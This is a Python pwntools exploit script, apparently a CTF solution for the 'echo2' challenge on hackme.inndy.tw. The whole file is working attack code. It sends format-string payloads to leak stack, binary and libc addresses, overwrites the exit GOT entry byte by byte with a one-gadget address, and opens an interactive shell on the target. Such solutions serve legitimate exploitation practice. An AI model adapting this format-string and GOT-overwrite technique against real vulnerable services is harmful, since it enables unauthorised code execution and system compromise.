#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
from sys import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c' ]

if argv[1] == 'l':
	io = process('./echo2',env = {"LD_PRELOAD": "./libc-2.23.so.x86_64"})
	
else:
	io = remote('hackme.inndy.tw',7712)

libc = ELF('./libc-2.23.so.x86_64')
elf = ELF('./echo2')
offset = 6

def DEBUG():
	
	gdb.attach(io)

def Success(name,addr):
	
	success("{} -> {}".format(name,hex(addr)))

def leak_stack(offset,differ):
	
	payload = "++%{}$p+".format(offset)
	io.sendline(payload)

	io.recvuntil('++')
	real_addr = eval(io.recvuntil('+')[:-1])-differ

	return real_addr

def leak_addr(addr):

	payload = "++%7$s++" + p64(addr)
	io.sendline(payload)
	io.recvuntil('++')
	real_addr = u64(io.recvuntil('++')[:-2]+'\x00'*2)
	
	return real_addr

if __name__ == "__main__":
	
#DEBUG()
	elf_base = leak_stack(0x23+6,74)-elf.sym['main']
	Success('elf_base',elf_base)

	printf_got = elf_base+elf.got['printf']
	printf_addr = leak_addr(printf_got)
	
	setvbuf_got = elf_base+elf.got['setvbuf']
	setvbuf_addr = leak_addr(setvbuf_got)
	
	Success('printf',printf_addr)
	Success('setvbuf',setvbuf_addr)
	
	libc_base = printf_addr - libc.sym['printf']
	Success('libc_base',libc_base)
	MAGIC = libc_base + 0x45206
	Success("MAGIC",MAGIC)

	exit_got = elf_base+elf.got['exit']
	exit_addr = leak_addr(exit_got)
	Success("exit",exit_addr)
	
	#exit->MAGIC 
	a = MAGIC  
	for i in range(6):
		
#		DEBUG()
		payload = "%{}c%8$hhn".format(a&0xff).ljust(16,'+')
		payload += p64(exit_got+i)
		
		io.sendline(payload)
		a = a>>8
#gdb.attach(io)	
	io.sendline('exit')
	io.interactive()
